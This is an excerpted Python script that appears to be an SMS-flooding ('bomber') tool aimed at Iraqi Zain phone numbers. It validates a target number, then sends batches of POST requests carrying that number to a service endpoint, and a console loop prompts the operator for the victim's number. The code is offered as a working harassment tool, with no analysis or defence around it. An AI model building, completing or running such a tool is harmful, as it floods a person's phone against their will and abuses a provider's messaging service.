...
def send_batch_requests(msisdn, batch_size):
    def _single(ms):
        try:
            r = requests.post(TARGET_URL, json={"msisdn": ms}, timeout=REQUEST_TIMEOUT)
            return True
        except Exception:
            return False
    results = []
...
def validate_number(raw):
    s = raw.strip()
    if s.startswith("+964"):
        return False, "Write the number without +964, e.g 78********"
    if s.startswith("0"):
        return False, "Send the number in format 78******** without leading 0"
    if not s.isdigit() or len(s) != 10:
        return False, "Number must be 10 digits, e.g 7806425219"
    if not s.startswith("78"):
        return False, "Only Iraqi Zain numbers starting with 78 are allowed"
    return True, s
...
def smqz():
    while True:
        ...
        time.sleep(0.12)
        while True:
            print(CYAN + f"Enter phone number {DARK_RED}(Only Zain Iraq !) {CYAN}: " + RESET, end="")
            raw = input().strip()
            print()
            if raw == "00":
                clear()
